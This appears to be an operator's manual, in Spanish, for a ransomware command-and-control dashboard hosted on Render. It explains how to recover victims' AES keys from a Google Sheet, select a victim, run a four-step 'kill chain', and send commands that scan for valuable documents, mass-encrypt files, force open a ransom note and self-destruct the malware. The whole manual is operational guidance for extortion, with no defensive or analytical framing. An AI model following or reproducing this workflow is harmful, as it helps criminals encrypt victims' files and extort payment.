# 📖 Manual de Operaciones: C2 Dashboard & Recovery

Este manual describe el uso diario del sistema C2 y los procedimientos de emergencia para recuperación de claves.

---

## 🆘 Procedimiento de Recuperación de Claves (Cloud Fallback)

**Escenario Crítico**: El servidor de Render se ha reiniciado y el Dashboard muestra claves vacías o "N/A" para clientes que ya estaban cifrados.

### Pasos de Recuperación:
1.  Accede a tu **Google Sheet** (Base de Datos).
2.  Busca la pestaña **"Keys"** o **"Clients"**.
3.  Localiza la fila correspondiente al **ID del Cliente** o **Hostname** afectado.
4.  Copia el valor de la columna **AES_KEY** (string hexadecimal de 64 caracteres).
5.  **Uso Manual**:
    *   Puedes usar esta clave para descifrar manualmente archivos `.cript` usando herramientas como OpenSSL o un script de Node.js local si el comando de descifrado remoto falla.

---

## 🎛️ Operaciones del Dashboard

### 1. Panel de Control (Home)
*   **Selector de Cliente**: Permite elegir una víctima específica para enviar comandos dirigidos.
*   **Estado WS**: "Online" indica conexión activa con el servidor Socket.IO.
*   **Ejecución en Cadena**: Botones numerados 1-4 para ejecutar el "Kill Chain" completo en orden.

### 2. Comandos Remotos (Consola)
Comandos nativos que se pueden enviar desde la caja de texto:
*   `dir` / `ls`: Listar archivos.
*   `whoami`: Ver usuario actual.
*   `c2:scan`: Escaneo rápido de documentos valiosos.
*   `c2:encrypt`: Lanzar cifrado masivo.

---

## ⚡ Comandos Especiales ("Magic Words")

El cliente reconoce prefijos especiales para tareas automatizadas:

| Comando | Acción |
|---------|--------|
| `c2:scan` | Escanea recursivamente buscando .pdf, .docx, .xlsx, .jpg |
| `c2:encrypt [n]` | Cifra `n` archivos (defecto: 100). Ej: `c2:encrypt 500` |
| `c2:ransom` | Fuerza la apertura de la nota de rescate (GUI) |
| `c2:kill` | **⚠️ Destructivo**: Detiene la persistencia y elimina el malware (Self-destruct) |

---

## 🐛 Solución de Problemas (Troubleshooting)

### Dashboard "Dormido"
Si al entrar ves "WS: Offline":
1.  Espera 30-60 segundos. Render pone en suspensión los servicios gratuitos tras inactividad.
2.  Recarga la página (F5).

### Cliente conectado pero no responde
1.  El cliente puede estar tras un Firewall estricto que bloquea WebSockets.
2.  Intenta enviar un comando simple como `ping 127.0.0.1` para verificar vida.
3.  Si no responde, espera al próximo "Heartbeat" (reconexión automática cada 5-10 min).

---